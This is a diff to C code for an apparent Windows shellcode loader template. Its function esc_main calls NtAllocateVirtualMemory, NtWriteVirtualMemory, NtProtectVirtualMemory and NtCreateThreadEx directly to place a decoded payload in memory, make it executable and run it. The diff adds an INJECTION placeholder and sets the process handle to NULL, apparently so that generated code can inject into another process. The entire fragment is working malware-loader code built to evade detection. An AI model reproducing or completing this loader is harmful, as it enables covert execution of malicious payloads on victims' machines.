@@ -26,7 +26,7 @@ DWORD WINAPI esc_main(LPVOID lpParameter)
 
 
     //####SYSCALL####
-    HANDLE hProc = GetCurrentProcess();
+    HANDLE hProc = NULL;
     DWORD oldprotect = 0;
     PVOID base_addr = NULL;
     HANDLE hThread = NULL;
@@ -34,17 +34,19 @@ DWORD WINAPI esc_main(LPVOID lpParameter)
     SIZE_T pnew = length;
     
 
+    //####INJECTION####
+
     // Allocate memory for shellcode
     NTSTATUS status = NtAllocateVirtualMemory(hProc, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
     // Write shellcode to allocated memory
-    status = NtWriteVirtualMemory(hProc, base_addr, decoded, length, &bytesWritten);
+    status = NtWriteVirtualMemory(hProc, base_addr, decoded, length, 0);
 
     // Change memory protection to executable
     status = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&length, PAGE_EXECUTE_READ, &oldprotect);
 
     // Create a new thread to execute the shellcode
-    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc, base_addr, NULL, 0, 0, 0, 0, NULL);
+    status = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProc, base_addr, base_addr, 0, NULL, NULL, NULL, NULL);
 
     // Wait for thread to complete
     status = NtWaitForSingleObject(hThread, FALSE, NULL);
